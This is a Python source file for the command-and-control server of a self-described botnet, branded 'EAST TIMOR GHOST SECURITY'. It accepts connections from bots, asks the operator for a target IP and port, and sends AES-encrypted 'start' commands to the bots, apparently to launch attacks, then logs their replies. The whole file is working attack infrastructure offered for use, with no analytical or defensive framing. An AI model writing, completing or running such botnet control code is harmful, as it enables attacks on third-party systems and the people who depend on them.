from config import KEY, C2_SERVER_IP, C2_SERVER_PORT
import socket
import json
import logging
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
from base64 import b64encode, b64decode

# Banner dengan warna ANSI

def print_banner():
    banner = """
\033[33m███████╗ █████╗ ███████╗████████╗    ████████╗██╗███╗   ███╗ ██████╗ ██████╗      ██████╗ ██╗  ██╗ ██████╗ ███████╗████████╗███████╗███████╗ ██████╗\033[0m
\033[33m██╔════╝██╔══██╗██╔════╝╚══██╔══╝    ╚══██╔══╝██║████╗ ████║██╔═══██╗██╔══██╗    ██╔════╝ ██║  ██║██╔═══██╗██╔════╝╚══██╔══╝██╔════╝██╔════╝██╔════╝\033[0m
\033[37m█████╗  ███████║███████╗   ██║          ██║   ██║██╔████╔██║██║   ██║██████╔╝    ██║  ███╗███████║██║   ██║███████╗   ██║   ███████╗█████╗  ██║     \033[0m
\033[37m██╔══╝  ██╔══██║╚════██║   ██║          ██║   ██║██║╚██╔╝██║██║   ██║██╔══██╗    ██║   ██║██╔══██║██║   ██║╚════██║   ██║   ╚════██║██╔══╝  ██║     \033[0m
\033[31m███████╗██║  ██║███████║   ██║          ██║   ██║██║ ╚═╝ ██║╚██████╔╝██║  ██║    ╚██████╔╝██║  ██║╚██████╔╝███████║   ██║   ███████║███████╗╚██████╗\033[0m
\033[31m╚══════╝╚═╝  ╚═╝╚══════╝   ╚═╝          ╚═╝   ╚═╝╚═╝     ╚═╝ ╚═════╝ ╚═╝  ╚═╝     ╚═════╝ ╚═╝  ╚═╝ ╚═════╝ ╚══════╝   ╚═╝   ╚══════╝╚══════╝ ╚═════╝\033[0m

\033[32m                                              EAST TIMOR GHOST SECURITY      \033[0m
\033[32m                                              Version 1.1            \033[0m
\033[32m                                              BOTNET               \033[0m
    """
    print(banner)

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('c2_server.log'),
        logging.StreamHandler()
    ]
)

def encrypt_data(data):
    cipher = AES.new(KEY, AES.MODE_CBC)
    ct_bytes = cipher.encrypt(pad(data.encode(), AES.block_size))
    return b64encode(cipher.iv + ct_bytes).decode()

def decrypt_data(encrypted_data):
    encrypted_data = b64decode(encrypted_data)
    iv = encrypted_data[:AES.block_size]
    ct = encrypted_data[AES.block_size:]
    cipher = AES.new(KEY, AES.MODE_CBC, iv)
    return unpad(cipher.decrypt(ct), AES.block_size).decode()

def start_c2_server():
    print_banner()
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.bind((C2_SERVER_IP, C2_SERVER_PORT))
    server_socket.listen(5)
    logging.info(f"C2 server running on {C2_SERVER_IP}:{C2_SERVER_PORT}")

    try:
        while True:
            client_socket, addr = server_socket.accept()
            logging.info(f"Connection from {addr}")
            try:
                target_ip = input("Target IP: ").strip()
                target_port = int(input("Target port: ").strip())

                command = {
                    "action": "start",
                    "target_ip": target_ip,
                    "target_port": target_port
                }
                encrypted_command = encrypt_data(json.dumps(command))
                client_socket.send(encrypted_command.encode())
                logging.info(f"Command sent: {command}")

                data = client_socket.recv(1024).decode()
                if data:
                    decrypted_data = decrypt_data(data)
                    response = json.loads(decrypted_data)
                    logging.info(f"Response from bot: {response}")
            except Exception as e:
                logging.error(f"Error handling C2 command: {e}")
            finally:
                client_socket.close()
    except KeyboardInterrupt:
        logging.info("C2 server stopped.")
    finally:
        server_socket.close()

if __name__ == "__main__":
    start_c2_server()
